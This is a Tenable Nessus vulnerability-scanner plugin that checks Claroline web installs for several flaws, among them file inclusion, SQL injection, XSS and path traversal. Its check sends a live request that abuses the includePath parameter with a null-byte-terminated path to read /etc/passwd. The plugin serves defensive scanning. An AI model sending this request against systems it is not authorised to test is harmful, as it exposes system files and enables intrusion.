#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(18165);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/06/01");

  script_cve_id(
    "CVE-2005-1374",
    "CVE-2005-1375",
    "CVE-2005-1376",
    "CVE-2005-1377"
  );
  script_bugtraq_id(13407);

  script_name(english:"Claroline < 1.5.4 / 1.6.0 Multiple Vulnerabilities (RFI, SQLi, XSS, Traversal)");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
variety of attacks.");
  script_set_attribute(attribute:"description", value:
"The version of Claroline (an open source, collaborative learning
environment) installed on the remote host suffers from a number of
remotely-exploitable vulnerabilities, including:

  - Multiple Remote File Include Vulnerabilities
    Four scripts let an attacker read arbitrary files on the 
    remote host and possibly even run arbitrary PHP code, 
    subject to the privileges of the web server user.

  - Multiple SQL Injection Vulnerabilities
    Seven scripts let an attacker inject arbitrary input
    into SQL statements, potentially revealing sensitive
    data or altering them.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can pass arbitrary HTML and script code
    through any of 10 flawed scripts and potentially have
    that code executed by a user's browser in the context 
    of the affected website.

  - Multiple Directory Traversal Vulnerabilities
    By exploiting flaws in 'claroline/document/document.php' 
    and 'claroline/learnPath/insertMyDoc.php', project leaders
    (teachers) are able to upload files to arbitrary folders 
    or copy/move/delete (then view) files of arbitrary folders.");
  # http://web.archive.org/web/20060206084817/http://www.zone-h.org/advisories/read/id=7472
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5d5e500e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Claroline version 1.5.4 / 1.6.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/04/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/04/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_require_keys("www/claroline");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Check for the vulnerability by trying to grab a file.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/claroline/inc/claro_init_header.inc.php?",
      "includePath=/etc/passwd%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # It's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
